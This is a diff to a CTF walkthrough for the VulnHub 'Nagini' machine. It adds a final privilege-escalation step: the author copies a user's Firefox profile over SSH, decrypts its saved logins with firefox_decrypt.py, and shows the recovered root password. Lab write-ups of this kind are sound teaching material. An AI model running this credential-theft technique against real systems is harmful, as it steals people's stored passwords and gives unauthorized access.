@@ -1,6 +1,6 @@
 # Walkthrough VULNHUB --> HARRY POTTER: NAGINI
 
-First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.172.
+First step is to scan our Netwok to find the machine IP, in my case the host has ip 192.168.1.174.
 
 We use nmap to scan the target machine with the command:
 
@@ -320,3 +320,38 @@ horcrux_{NXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXU=}
 hermoine@Nagini:~$
 
 ```
+
+Searching on the machine for a way to escalate the priviliges, I couldn't find anything.
+
+The only valuable thing i found is in hermoine home, and it is the .mozilla folder
+
+The latest versions of Firefox store passwords, encrypted, in a JSON text file, logins.json, in your Firefox profile folder at /home/'yourProfile'/.firefox/ or /home/'yourProfile'/.mozilla/firefox.
+
+I found a [firefox decryptor](https://github.com/Unode/firefox_decrypt/blob/master/firefox_decrypt.py) and I'm going to use it to see if we get something useful.
+
+Before to run it, we have to download the .mozilla from hrmoine home.
+
+```bash
+scp -r -i ~/.ssh/id_rsa hermoine@quic.nagini.hogwarts:/home/hermoine/.mozilla /tmp/nagini/.
+```
+
+We can now run the **firfox_decrypt.py**
+
+```bash
+┌──(animale㉿kali)-[~/Tools/firefox_decrypt]
+└─$ python3 firefox_decrypt.py /tmp/nagini/.mozilla/firefox                                                                                                         1 ⨯
+
+Website:   http://nagini.hogwarts
+Username: 'root'
+Password: '@Alohomora#123'
+```
+
+#### **BOOM BOOM!!!!!!! We got it!!!!**
+
+Let's connect in ssh!
+
+![Alt text](./img/rootSSH.PNG?raw=true "ROOT SSH")
+
+Finally we are **root**... Let's take the last flag!!!!
+
+![Alt text](./img/rootFlag.PNG?raw=true "ROOT Flag")
